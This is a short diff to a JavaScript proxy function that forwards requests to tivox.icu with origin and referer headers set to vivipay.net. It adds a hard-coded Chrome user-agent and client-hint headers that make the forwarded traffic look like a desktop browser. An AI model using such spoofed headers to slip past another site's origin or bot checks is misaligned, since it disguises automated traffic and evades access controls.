@@ -792,6 +792,10 @@ async function proxyToTivox(req) {
   fwd['host'] = 'tivox.icu';
   fwd['origin'] = 'https://vivipay.net';
   fwd['referer'] = 'https://vivipay.net/';
+  fwd['user-agent'] = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36';
+  fwd['sec-ch-ua'] = '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"';
+  fwd['sec-ch-ua-mobile'] = '?0';
+  fwd['sec-ch-ua-platform'] = '"Windows"';
   const opts = { method: req.method, headers: fwd, redirect: 'manual' };
   if (req.method !== 'GET' && req.method !== 'HEAD' && req.rawBody && req.rawBody.length > 0) {
     opts.body = req.rawBody;
